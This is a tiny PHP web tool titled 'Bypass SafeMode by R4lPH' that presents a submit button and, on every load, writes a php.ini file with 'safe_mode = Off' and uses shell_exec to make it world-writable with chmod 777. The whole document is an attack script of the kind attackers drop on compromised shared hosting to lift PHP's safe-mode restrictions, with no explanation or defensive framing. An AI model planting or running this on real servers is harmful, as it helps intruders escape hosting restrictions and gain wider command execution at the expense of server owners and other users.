<title>Bypass SafeMode by R4lPH</title>
<form method="POST" action="<?php basename($_SERVER['PHP_SELF']);  ?>">
    Bypass Safemode:<input type="submit" name="smoff" value=">>">
<?php
    $lol = fopen("php.ini",'w+');
    fwrite($lol, 'safe_mode = Off ');
    fclose($lol);
    shell_exec('chmod 777 php.ini');
?>
